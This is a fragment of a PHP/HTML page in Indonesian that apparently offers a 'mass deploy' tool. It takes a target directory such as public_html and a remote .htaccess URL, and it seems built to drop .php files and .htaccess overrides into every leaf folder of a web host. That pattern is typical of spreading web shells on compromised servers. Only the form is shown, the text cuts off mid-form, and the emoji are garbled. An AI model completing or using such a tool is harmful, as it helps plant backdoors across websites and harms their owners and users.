<body>
    <h2>ğŸš€ Mass Deploy .php + .htaccess ke Leaf Folder</h2>
    
    <?php if ($_SERVER['REQUEST_METHOD'] !== 'POST'): ?>
    <form method="POST" onsubmit="document.getElementById('submitBtn').disabled = true; document.getElementById('submitBtn').innerText = 'ğŸš€ Memproses...';">
        <label for="target_path">ğŸ“ Target Path:</label>
        <input type="text" id="target_path" name="target_path" required placeholder="/home/user/public_html">

        <label for="htaccess_url">ğŸŒ URL .htaccess:</label>
